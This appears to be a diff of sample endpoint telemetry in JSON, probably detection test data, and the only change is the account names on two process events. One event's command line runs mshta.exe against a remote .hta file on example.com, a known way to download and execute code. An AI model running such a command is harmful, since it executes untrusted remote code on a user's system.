@@ -9,14 +9,14 @@
   {
     "event_time": "2026-11-19 10:05:00",
     "hostname": "NEW-PC-02",
-    "accountname": "Alice",
+    "accountname": "Pedro",
     "process_image": "C:\\Windows\\System32\\notepad.exe",
     "process_command_line": "notepad.exe"
   },
   {
     "event_time": "2026-11-19 10:10:00",
     "hostname": "NEW-PC-03",
-    "accountname": "Bob",
+    "accountname": "Hafidh",
     "process_image": "C:\\Windows\\System32\\mshta.exe",
     "process_command_line": "mshta.exe https://example.com/a.hta"
   },
